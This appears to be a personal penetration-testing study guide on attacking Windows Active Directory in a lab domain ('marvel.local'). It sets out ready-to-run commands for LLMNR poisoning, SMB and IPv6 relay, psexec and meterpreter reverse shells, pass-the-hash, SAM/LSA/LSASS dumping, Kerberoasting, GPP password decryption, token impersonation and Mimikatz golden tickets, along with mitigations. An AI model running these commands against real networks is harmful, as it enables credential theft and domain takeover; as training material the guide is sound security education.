*  1.Introduction
* 2.Attacking Active Directory: Initial Attack Vectors
	* 1- LLMNR Poisoning
	* 2- SMB Relay
	* 3- Gaining Shell Access
*  3.Attacking Active Directory: Post-Compromise Enumeration
 * 4.Attacking Active Directory: Post-Compromise Attacks	
 





# Introduction
* Active Directory (AD) - Directory service developed by Microsoft to manage Windows domain networks; authenticates using Kerberos tickets.
* Physical AD components : 
	* Domain Controller : a server with the Active Directory Domain Services (AD DS) role, handling user authentication, authorization, and storing directory information in a Windows network domain.
	 * AD DS Data Store : contains the database files and processes responsible for storing and managing directory information for users, services, and applications in a Windows network domain. The primary file for the AD DS data store is Ntds.dit.

 * Logical AD components : 
	* AD DS -Schema: defines the structure and attributes of objects stored in the Active Directory database. It determines what types of objects can be stored and what properties those objects can have.
	* Domains : used to group and manage objects in an organization
	* Tress : hierarchy of domains in AD DS.
	* Forest : Collection of domains in AD DS
	* Organisation Units(OUs) :  AD containers that can contain users, groups, containers and other OUs.
	* Trusts : mechanism for users to gain access to resources in another domain; can be directional or transitive.
	* Objects - user, groups, contacts, computers, etc.; everything inside a domain.

# Attacking Active Directory: Initial Attack Vectors
* [This article](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa) covers some common ways to attack active directory computers and get domain admin.
## 1 - LLMNR Poisoning : 


* Protocol used to identify hosts when DNS fails to do so
* previously known as NBT-NS
* Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to.

* Steps: 
	* Run Responder tool in kali : 
	  ```
	  ip a 
	  #note interface
	  
		   responder.py -I eth0 -dwPv
	  ```
	  
	  * event occurs in windows 
	  * Obtain hashes and crack them using Hachcat
	  ```
	  hashcat -m 5600 ntlmhash.txt rockyou.txt
	  #-m 5600 for NTLMv2
	  #ntlmhash.txt contains the hashes
	  ```
	  * Mitigation : 
		  * Disable LLMNR and NTB-NS
		  * Require Network Access Control
		  * Use Strong Password Policy

## 2- SMB Relay
* Instead of cracking hashes gathered with responder, we can instead relay those hashes to specific machines and potentially gain access
* Requirements : 
	* SMB signing must be disabled on target
	* relayed user creds must be admin on machine

 * Steps: 
	 * Discover hosts with SMB signing disabled
```
nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24 -Pn
#we need to note down machines with 'message signing enabled but not required'

vim targets.txt
#add target IPs
```
  * Edit Responder config -turn SMB and HTTP off
```
vim /etc/responder/Responder.conf
#turn SMB, HTTP off
```
* Run Responder tool
```
sudo Responder -I eth0 -rdw
```
* Setup Relay
```
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

#trigger connection in Windows machine
#by pointing it at the attacker machine

#-i option can be used for an interactive shell
```
* Event occurs in Windows Machine
* Credentials are captured and we get access to machine

* Mitigation : 
	* Enable SMB signing on all devices
	* Disable NTLM authentification on network
	* account tiering
	* Local admin restriciton (to prevent lateral movement)


## 3- Gaining Shell Access

```
#this step has to be done once we have the credentials
msfconsole

search psexec

use exploit/windows/smb/psexec

options
#set all required options
#such as RHOSTS, smbdomain, smbpass and smbuser

set payload windows/x64/meterpreter/reverse_tcp

set LHOST eth0

run
#run exploit
```

```
#we can use another tool called psexec.py
impacket-psexec marvel.local/fcastle:Password1@10.0.0.25

#we can also utilise hashes in order to get shell access( we do not need to crack the hash)
psexec.py administrator@10.0.0.25 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f

#try multiple options if these tools do not work
#such as smbexec and wmiexec
```

## 4 - IPv6 Attacks 
* for more ressources [mitm6 attacks](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) and [NTLM relays](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) 
```
#download and setup the mitm6 tool

#setup LDAPS as well

mitm6 -d marvel.local

#setup relay
impacket-ntlmrelayx -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
#generate activity on Windows machine by rebooting it
#this dumps info in another directory

ls lootme
#contains useful info
#if we keep the program running in background, and the user logins, the creds can be captured
```

* Mitigation : 
	* Block DHCPv6 traffic and incoming router advertisements.
	* Disable WPAD via Group Policy.
	* Enable both LDAP signing and LDAP channel binding.
	* Mark Admin users as Protected Users or sensitive accounts.

 * [Pass-Back attacks](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack) can be used for printer hacking.

# Post-Compromise Enumeration

* LdapDomainDump : 
  ``` 
  > sudo ldapdomaindump ldaps://192.168.138.136 -u 'MARVEL\fcastle' -p Password1
  ```
  * Bloodhound
  ``` 
  > sudo neo4j console
  > sudo bloodhound (in another tab )
  > sudo bloodhound-python -d MARVEL.local -u THEPUNISHER -p Password1 -ns 192.168.1.22 -c all  (in another tab)
  ```

#  Post-Compromise Attacks
 * 1 -  Pass the Hash : 
 ```
  crackmapexec smb <ip> -u <username> -d <domain> -p <password>
  #sweep entire network
  #attempts to gain access via pass the password
  #can also spray passwords

  crackmapexec smb <ip/CIDR> -u <username> -d <domain> -H <hash> --local-auth
  #use a hash in place of a password

  crackmapexec smb <ip/CIDR> -u <username> -d <domain> -H <hash> --local-auth --sam
  #dump the sam 

   crackmapexec smb <ip/CIDR> -u <username> -d <domain> -H <hash> --local-auth --shares
   #enumerate the shares 

  crackmapexec smb <ip/CIDR> -u <username> -d <domain> -H <hash> --local-auth --lsa 
  #dump the lsa

crackmapexec smb <ip/CIDR> -u <username> -d <domain> -H <hash> --local-auth -M lsassy
  #dump the lsass 
  #store credentials 
  (> Cmedb #for the database)


  impacket-secretsdump <domain>/username:'password'@ip



 ```
- Mitigations:
    - Limit account reuse
    - Disable Guest and Administrator accounts
    - Use strong passwords
    - Privilege Access Management (PAM)


* 2 - Kerborasting:
	 * Goal of [Kerberoasting](https://medium.com/@Shorty420/kerberoasting-9108477279cc) is to get TGS (Ticket Granting Service) and decrypt the server's account hash.

```
> GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
#needs username, password from domain account and its ip
#this provides us the hash, can be cracked using hashcat

> hashcat -m 13100 hash.txt rockyou.txt
#cracks the hash
```
*   Mitigations:
    - Strong passwords
    - Least privilege (service accounts should not be made domain admins)


* 3 - Token impersonation:
	* Tokens - temporary keys that allow access without using creds; can be either delegate (login, RDP) or impersonate (drive, script).

```
> msfconsole

> use exploit/windows/smb/psexec

> set smbpass Password1

> set smbuser fcastle

> set target 2
#native upload

> options

> set payload windows/x64/meterpreter/reverse_tcp

> set lhost eth0

> run
#gives meterpreter session

> hashdump

> load incognito
#metasploit module for token impersonation

> list_tokens -u
#list tokens by user

> impersonate_token marvel\\administrator
#two backslashes instead of one for character-escaping

> whoami
#test if it worked

> rev2self
#revert to old user
```

* GPP (Group Policy Preferences):

	- GPP allowed admins to create policies using embedded creds (cPassword) which got leaked; patched in MS14-025.
```
#after basic enumeration via nmap
#we get to know that it is domain controller

> smbclient -L \\\\10.10.10.100\\
#includes SYSVOL

> smbclient -L \\\\10.10.10.100\\Replication
#accessing an open share
#find Groups.xml, which includes CPassword

#in attacker machine
> gpp-decrypt <CPassword>
#gives password

#with username and password, we can use Kerberoasting
> GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
#gives service ticket hash

> hashcat -m 13100 hash.txt rockyou.txt
#cracks hash

> psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
```


* Mimikatz:
```
#in victim machine
mimikatz.exe

privilege::debug

sekurlsa::logonpasswords
#dump passwords

lsadump::sam

lsadump::lsa /patch
#dump lsa

#for golden ticket attacks
lsadump::lsa /inject /name:krbtgt
#copy the SID and NTLM from output

kerberos::golden /User:fakeAdministrator /domain:marvel.local /sid:<SID> /krbtgt:<NTLM hash> /id:500 /ptt
#to generate golden ticket and use pass-the-ticket

misc::cmd
#gets command prompt
#as Admin
```
